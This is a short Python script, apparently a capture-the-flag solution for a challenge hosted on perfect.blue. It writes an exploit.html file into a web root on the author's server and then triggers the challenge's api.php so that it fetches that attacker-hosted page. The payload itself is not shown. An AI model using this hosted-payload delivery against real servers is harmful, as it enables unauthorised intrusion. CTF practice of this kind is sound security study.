

f = open("./exploit.html")
data = f.read()
f.close()

f = open("/var/www/html/exploit.html", "w")
f.write(data)
f.close()
url = 'http://sploosh.chal.perfect.blue/api.php?url=http://tommyhfg.com/exploit.html'        
requests.get(url = url)
